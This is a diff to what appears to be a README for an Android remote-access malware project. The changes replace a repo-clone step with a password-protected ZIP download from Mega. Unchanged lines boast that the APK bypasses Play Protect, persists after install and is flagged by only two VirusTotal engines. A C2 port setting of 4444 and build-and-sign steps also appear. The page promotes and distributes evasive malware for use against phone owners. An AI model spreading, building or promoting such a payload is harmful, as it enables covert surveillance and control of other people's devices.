@@ -32,8 +32,12 @@
 > Bypasses Play Protect and runs persistently after install.
 
 ---
-## 📦 Encrypted Demo Package
-🔐 Password: 1234
+## 📥 Download
+> 🔐 Encrypted demo ZIP (APK + media) hosted on Mega:
+**[📦 Download from MEGA](https://mega.nz/file/XAN0XbCA#rlk6roGkZ-vHsCohVb2aYOJYtED6xb_aZBfHGoiDm7k)**  
+**Password:** `1234`
+>
+---
 ## 🧪 VirusTotal Scan Results
 - Flagged by **only 2 engines**:
   - `Google` → *Android:Agent-GEN*
@@ -77,7 +81,7 @@
    private val C2_PORT = 4444
    '''
 ---
-3. **Clone this repo**
+3. **Download Codes from Mega**
 Open in Android Studio
 Use Android 10–15+ build target
 Sign and export APK
